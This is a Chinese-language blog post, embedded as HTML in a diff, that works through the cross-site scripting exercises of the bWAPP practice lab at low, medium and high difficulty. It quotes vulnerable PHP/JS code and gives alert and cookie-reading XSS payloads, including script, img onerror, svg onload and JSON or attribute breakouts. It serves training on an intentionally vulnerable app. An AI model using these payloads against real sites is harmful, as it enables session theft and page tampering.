@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="XSS注入基础知识xss 演练反射型GET&#x2F;POST型low123&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;&#x2F;&#x2F;&lt;script&gt;alert(007)&lt;&#x2F;script&gt;&#x2F;&#x2F;&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;  mid123456&#x2F;&#x2F; 字符 &#39; &quot; \ 为转义为 \&#39;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bWAPP-XSS">
+<meta property="og:url" content="http://yoursite.com/2020/09/27/bWAPP-XSS/index.html">
+<meta property="og:site_name" content="Tansz">
+<meta property="og:description" content="XSS注入基础知识xss 演练反射型GET&#x2F;POST型low123&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;&#x2F;&#x2F;&lt;script&gt;alert(007)&lt;&#x2F;script&gt;&#x2F;&#x2F;&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;  mid123456&#x2F;&#x2F; 字符 &#39; &quot; \ 为转义为 \&#39;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2020/09/27/bWAPP-XSS/image-20201006183234683.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/27/bWAPP-XSS/image-20201006183413428.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/27/bWAPP-XSS/image-20201006185758145.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/27/bWAPP-XSS/image-20201007191839789.png">
+<meta property="article:published_time" content="2020-09-27T12:53:34.537Z">
+<meta property="article:modified_time" content="2020-10-07T11:59:15.009Z">
+<meta property="article:author" content="Tansz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/09/27/bWAPP-XSS/image-20201006183234683.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>bWAPP-XSS</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/01/05/iptables/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/09/27/NTFS-ADS/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/27/bWAPP-XSS/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/27/bWAPP-XSS/&text=bWAPP-XSS" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/27/bWAPP-XSS/&title=bWAPP-XSS" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/27/bWAPP-XSS/&is_video=false&description=bWAPP-XSS" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=bWAPP-XSS&body=Check out this article: http://yoursite.com/2020/09/27/bWAPP-XSS/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/27/bWAPP-XSS/&title=bWAPP-XSS" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/27/bWAPP-XSS/&title=bWAPP-XSS" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/27/bWAPP-XSS/&title=bWAPP-XSS" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/27/bWAPP-XSS/&title=bWAPP-XSS" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/27/bWAPP-XSS/&name=bWAPP-XSS&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/09/27/bWAPP-XSS/&t=bWAPP-XSS" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS注入"><span class="toc-number">1.</span> <span class="toc-text">XSS注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-number">1.1.</span> <span class="toc-text">基础知识</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#演练"><span class="toc-number">2.</span> <span class="toc-text">演练</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#反射型"><span class="toc-number">2.1.</span> <span class="toc-text">反射型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET-POST型"><span class="toc-number">2.1.1.</span> <span class="toc-text">GET&#x2F;POST型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSON反射"><span class="toc-number">2.1.2.</span> <span class="toc-text">JSON反射</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low-1"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">low</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#代码分析"><span class="toc-number">2.1.2.1.1.</span> <span class="toc-text">代码分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-high"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">mid&#x2F;high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AJAX反射"><span class="toc-number">2.1.3.</span> <span class="toc-text">AJAX反射</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low-mid"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">low&#x2F;mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-1"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML反射"><span class="toc-number">2.1.4.</span> <span class="toc-text">XML反射</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low-mid-1"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">low&#x2F;mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-2"><span class="toc-number">2.1.4.2.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Referer-注入"><span class="toc-number">2.1.5.</span> <span class="toc-text">Referer 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-1"><span class="toc-number">2.1.5.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-2"><span class="toc-number">2.1.5.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-1"><span class="toc-number">2.1.5.3.</span> <span class="toc-text">mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-3"><span class="toc-number">2.1.5.4.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Header注入"><span class="toc-number">2.1.6.</span> <span class="toc-text">Header注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-2"><span class="toc-number">2.1.6.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-3"><span class="toc-number">2.1.6.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-2"><span class="toc-number">2.1.6.3.</span> <span class="toc-text">mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-4"><span class="toc-number">2.1.6.4.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eval注入"><span class="toc-number">2.1.7.</span> <span class="toc-text">eval注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-3"><span class="toc-number">2.1.7.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-4"><span class="toc-number">2.1.7.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-3"><span class="toc-number">2.1.7.3.</span> <span class="toc-text">mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-5"><span class="toc-number">2.1.7.4.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HREF注入"><span class="toc-number">2.1.8.</span> <span class="toc-text">HREF注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-4"><span class="toc-number">2.1.8.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-5"><span class="toc-number">2.1.8.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-high-1"><span class="toc-number">2.1.8.3.</span> <span class="toc-text">mid&#x2F;high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-form注入"><span class="toc-number">2.1.9.</span> <span class="toc-text">Login form注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-5"><span class="toc-number">2.1.9.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-6"><span class="toc-number">2.1.9.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-high-2"><span class="toc-number">2.1.9.3.</span> <span class="toc-text">mid&#x2F;high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-SELF-注入"><span class="toc-number">2.1.10.</span> <span class="toc-text">PHP_SELF 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-6"><span class="toc-number">2.1.10.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-7"><span class="toc-number">2.1.10.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-4"><span class="toc-number">2.1.10.3.</span> <span class="toc-text">mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-6"><span class="toc-number">2.1.10.4.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#请求头Referer注入"><span class="toc-number">2.1.11.</span> <span class="toc-text">请求头Referer注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-7"><span class="toc-number">2.1.11.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-8"><span class="toc-number">2.1.11.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-5"><span class="toc-number">2.1.11.3.</span> <span class="toc-text">mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-7"><span class="toc-number">2.1.11.4.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#请求头User-Agent注入"><span class="toc-number">2.1.12.</span> <span class="toc-text">请求头User-Agent注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-8"><span class="toc-number">2.1.12.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-9"><span class="toc-number">2.1.12.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-6"><span class="toc-number">2.1.12.3.</span> <span class="toc-text">mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-8"><span class="toc-number">2.1.12.4.</span> <span class="toc-text">high</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#存储型"><span class="toc-number">2.2.</span> <span class="toc-text">存储型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#blog"><span class="toc-number">2.2.1.</span> <span class="toc-text">blog</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-9"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-10"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-7"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-9"><span class="toc-number">2.2.1.4.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Change-Secret-HTML-hidden-注入"><span class="toc-number">2.2.2.</span> <span class="toc-text">Change Secret(HTML hidden)注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-10"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-11"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-high-3"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">mid&#x2F;high</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        bWAPP-XSS
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Tansz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-09-27T12:53:34.537Z" itemprop="datePublished">2020-09-27</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="XSS注入"><a href="#XSS注入" class="headerlink" title="XSS注入"></a>XSS注入</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><a href="https://blog.csdn.net/hee_mee/article/details/107392651" target="_blank" rel="noopener">xss</a></p>
+<h1 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h1><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><h3 id="GET-POST型"><a href="#GET-POST型" class="headerlink" title="GET/POST型"></a>GET/POST型</h3><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/&lt;script&gt;alert(007)&lt;/</span>script&gt;</span><br><span class="line"><span class="comment">//&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mid"><a href="#mid" class="headerlink" title="mid"></a>mid</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字符 ' " \ 为转义为 \'  \"  \\</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_check_4</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// These characters are single quote ('), double quote ("), backslash (\) and NUL (the NULL byte).</span></span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;<span class="regexp">/script&gt; /</span><span class="regexp">/报错</span></span><br><span class="line"><span class="regexp">&lt;script&gt;alert(/</span>XSS/)&lt;<span class="regexp">/script&gt;  /</span><span class="regexp">/成功</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/在javascript 中 /</span> 和 <span class="string">" 可起到一样的作用 </span></span><br><span class="line"><span class="string">//&lt;script&gt;alert(007)&lt;/script&gt;  				//成功</span></span><br><span class="line"><span class="string">//&lt;script&gt;alert(document.cookie)&lt;/script&gt;   //成功</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//特殊被转义为HTML实体，无法绕过</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_check_3</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// htmlspecialchars - converts special characters to HTML entities    </span></span><br><span class="line">    <span class="comment">// '&amp;' (ampersand) becomes '&amp;amp;' </span></span><br><span class="line">    <span class="comment">// '"' (double quote) becomes '&amp;quot;' when ENT_NOQUOTES is not set</span></span><br><span class="line">    <span class="comment">// "'" (single quote) becomes '&amp;#039;' (or &amp;apos;) only when ENT_QUOTES is set</span></span><br><span class="line">    <span class="comment">// '&lt;' (less than) becomes '&amp;lt;'</span></span><br><span class="line">    <span class="comment">// '&gt;' (greater than) becomes '&amp;gt;'  </span></span><br><span class="line">    <span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding);</span><br><span class="line">       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="JSON反射"><a href="#JSON反射" class="headerlink" title="JSON反射"></a>JSON反射</h3><h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4><h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><p>关键代码如下</p>
+<p>通过URL获得字段<code>$title</code>，并在数组中查询,如果找不到就返回JSON数据。</p>
+<p>通过<a href="https://www.runoob.com/js/javascript-json-parse.html" target="_blank" rel="noopener">JSON.parse()</a>J将数据转换为 JavaScript 对象</p>
+<p>故可控制<code>$title</code>值对<code>&lt;script&gt;</code>进行闭合</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(! in_array(strtoupper($title), $movies))&#123;</span><br><span class="line">	$string = <span class="string">'&#123;"movies":[&#123;"response":"'</span> . $title . <span class="string">'??? Sorry, we don&amp;#039;t have that movie :("&#125;]&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">		<span class="keyword">var</span> JSONResponseString = <span class="string">'&lt;?php echo $string ?&gt;'</span>;</span><br><span class="line">     	<span class="comment">// var JSONResponse = eval ("(" + JSONResponseString + ")");</span></span><br><span class="line">        <span class="keyword">var</span> JSONResponse = <span class="built_in">JSON</span>.parse(JSONResponseString);</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">"result"</span>).innerHTML=JSONResponse.movies[<span class="number">0</span>].response;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&#125;]&#125;';alert(document.cookie)&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//"</span>&#125;]&#125;<span class="string">';&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//&lt;script&gt;</span></span><br><span class="line"><span class="string">//		var JSONResponseString = '</span>&lt;?php echo $string ?&gt;<span class="string">';</span></span><br><span class="line"><span class="string">//变为</span></span><br><span class="line"><span class="string">//&lt;script&gt;</span></span><br><span class="line"><span class="string">//		var JSONResponseString = '</span>&#123;<span class="string">"movies"</span>:[&#123;<span class="string">"response"</span>:<span class="string">""</span>&#125;]&#125;<span class="string">';alert(document.cookie)  &lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mid-high"><a href="#mid-high" class="headerlink" title="mid/high"></a>mid/high</h4><p>使用 <code>htmlspecialchars()</code>函数把特殊字符（&amp; ‘ “ &lt; &gt;）转义为HTML实体无法桡过</p>
+<h3 id="AJAX反射"><a href="#AJAX反射" class="headerlink" title="AJAX反射"></a>AJAX反射</h3><h4 id="low-mid"><a href="#low-mid" class="headerlink" title="low/mid"></a>low/mid</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(<span class="built_in">document</span>.cookie)&gt;</span><br><span class="line"><span class="comment">//&lt;svg onload=alert(document.cookie)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h4><p>使用 <code>htmlspecialchars()</code>函数把特殊字符（&amp; ‘ “ &lt; &gt;）转义为HTML实体无法桡过</p>
+<h3 id="XML反射"><a href="#XML反射" class="headerlink" title="XML反射"></a>XML反射</h3><h4 id="low-mid-1"><a href="#low-mid-1" class="headerlink" title="low/mid"></a>low/mid</h4><p><strong>在XML解析payload需要注意&lt;&gt;两个字符需要使用HTML实体编码</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;img src=x onerror=alert(<span class="built_in">document</span>.cookie)&amp;gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h4><p>使用 <code>htmlspecialchars()</code>函数把特殊字符（&amp; ‘ “ &lt; &gt;）转义为HTML实体无法桡过</p>
+<h3 id="Referer-注入"><a href="#Referer-注入" class="headerlink" title="Referer 注入"></a>Referer 注入</h3><h4 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>XSS - Reflected (Back Button)<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Click the button to go to back to the previous page:</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">button</span> <span class="attr">value</span>=<span class="string">"Go back"</span> <span class="attr">onClick</span>=<span class="string">"document.location.href='&lt;?php echo isset($_SERVER["</span><span class="attr">HTTP_REFERER</span>"]) ? <span class="attr">xss</span>($<span class="attr">_SERVER</span>["<span class="attr">HTTP_REFERER</span>"]) <span class="attr">:</span> ""?&gt;</span>'"&gt;</span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/27/bWAPP-XSS/image-20201006183234683.png" alt="image-20201006183234683"></p>
+<p>对onClick进行适当闭合即可</p>
+<h4 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/27/bWAPP-XSS/image-20201006183413428.png" alt="image-20201006183413428"></p>
+<h4 id="mid-1"><a href="#mid-1" class="headerlink" title="mid"></a>mid</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此处使用addslashes()函数导致<code>&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code>但是 <code>&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>却可以绕过，可见 <code>&gt;</code>之前的 <code>&quot;</code>不受影响</p>
+<h4 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h4><p>无法绕过</p>
